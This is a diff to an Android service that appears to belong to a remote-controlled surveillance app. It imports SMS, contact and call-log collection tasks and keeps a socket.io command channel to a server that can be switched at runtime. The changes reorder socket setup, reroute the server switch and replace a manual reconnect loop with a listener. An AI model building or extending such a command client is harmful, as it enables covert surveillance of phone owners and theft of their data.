@@ -19,6 +19,7 @@ import io.socket.client.Ack;
 import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
+
 import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
@@ -52,9 +53,9 @@ public class CommandService extends Service {
         params = new CommonParams(this);
         client = this;
         connected = false;
-        createSocket(params.getServer());
         locationTask = new LocationMonitorTask(this);
         locationTask.start();
+        createSocket(params.getServer());
 
     }
 
@@ -72,14 +73,16 @@ public class CommandService extends Service {
     }
 
     public void changeServer(String url) {
+        params = new CommonParams(this);
         socket.disconnect();
-        params.setServer(url);
+        locationTask.setServer(url);
         createSocket(url);
         socket.connect();
     }
 
-    private void createSocket (String url) {
+    private void createSocket(String url) {
         try {
+
             socket = IO.socket(url);
             socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
 
@@ -194,19 +197,18 @@ public class CommandService extends Service {
                         @Override
                         public void run() {
                             Log.i(TAG, "Socket reconnecting...");
-                            try {
-                                Thread.sleep(5000);
-                            } catch (InterruptedException e) {
-                                e.printStackTrace();
-                            }
-                            if (!connected)
-                                socket.connect();
                         }
                     });
 
-                    reconnect.start();
                 }
 
+            });
+
+            socket.on(Socket.EVENT_RECONNECTING, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.i(TAG, "Socket reconnecting...");
+                }
             });
 
         } catch (URISyntaxException e) {
